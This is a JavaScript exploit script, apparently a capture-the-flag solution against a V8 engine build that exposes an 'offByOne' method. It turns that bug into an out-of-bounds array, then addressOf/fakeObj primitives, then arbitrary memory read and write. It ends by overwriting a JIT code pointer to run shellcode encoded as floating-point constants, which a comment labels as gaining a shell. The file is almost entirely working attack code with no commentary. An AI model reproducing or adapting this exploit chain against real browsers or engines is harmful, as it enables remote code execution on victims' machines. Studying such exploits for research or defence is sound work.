var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);

function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}

function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}

function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}

function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}

function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}

function u32_to_f32(val){
    u32[0] = val;
    return f32[0];
}


// function stop(){
//     %SystemBreak();
// }

// function p(arg){
//     %DebugPrint(arg);
// }

function spin(){
    while(1){};
}

function hex(str){
    return str.toString(16).padStart(16,0);
}

function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}

// // gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}

const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}

for(let i = 0; i< 10000; i++){
    shellcode();
}

function getOffByOne(target){
    return f64_to_u64(target.offByOne());
}
function setOffByOne(target, val){
    target.offByOne(Number((val)));
}


var oob_array = [1.1];
var obj = {in_obj:1};
obj.a = 2;
var b = [2.2];

// p(oob_array);
// p(obj);
// p(b);

obj_map_addr = u64_to_u32_lo(getOffByOne(oob_array)); //map, properties
obj_properties_addr = u64_to_u32_hi(getOffByOne(oob_array));
elements_addr_of_a = obj_properties_addr - 0x64;
logg("obj_map_addr", obj_map_addr);
logg("obj_properties_addr", obj_properties_addr);
logg("elements_addr_of_a", elements_addr_of_a);

setOffByOne(oob_array, lh_u32_to_f64(obj_map_addr,elements_addr_of_a-4));
obj.a = 0x1000;
setOffByOne(oob_array, lh_u32_to_f64(obj_map_addr,elements_addr_of_a-4-0x10));
obj.a = 0x1000;
// console.log(oob_array.length);

let temp = f64_to_u64(oob_array[0x10]);
logg("tmp",temp);

double_array_map = u64_to_u32_lo(temp); //map, properties
double_properties_addr = u64_to_u32_hi(temp);
logg("double_array_map", double_array_map);
logg("double_properties_addr", double_properties_addr);



// // 修改了oob_array的elements length

function addressOf(object){
    oob_array[0x10] = lh_u32_to_f64(obj_map_addr,0);
    b[0] = object;
    oob_array[0x10] = lh_u32_to_f64(double_array_map,0);
    return f64_to_u64(b[0]);
}



function fakeObj(addr){
    oob_array[0x10] = lh_u32_to_f64(double_array_map,0);
    b[0] = lh_u32_to_f64(addr,0);
    oob_array[0x10] = lh_u32_to_f64(obj_map_addr,0);
    return b[0];
}

var fake_array = [
    lh_u32_to_f64(double_array_map,0),
    lh_u32_to_f64(0,0x1000)
];

var fake_array_addr = u64_to_u32_lo(addressOf(fake_array));
var fake_obj = fakeObj(fake_array_addr+0x54);

// p(fake_array);
logg("fake_array_addr",fake_array_addr);

function AAR(addr){
    fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
    return f64_to_u64(fake_obj[0]);
}

function AAW(addr,val){
    logg("addr",addr);
    logg("val",val);
    fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
    // stop();
    fake_obj[0] = u64_to_f64(val);
}

// p(shellcode);
var shellcode_addr = u64_to_u32_lo(addressOf(shellcode));
var code_addr = u64_to_u32_lo(AAR(shellcode_addr+0xc));
var ins_base = AAR((code_addr)+0x14);

logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);

AAW(code_addr+0x14,(BigInt(ins_base)+0x6bn));

// stop();
shellcode();

// spin();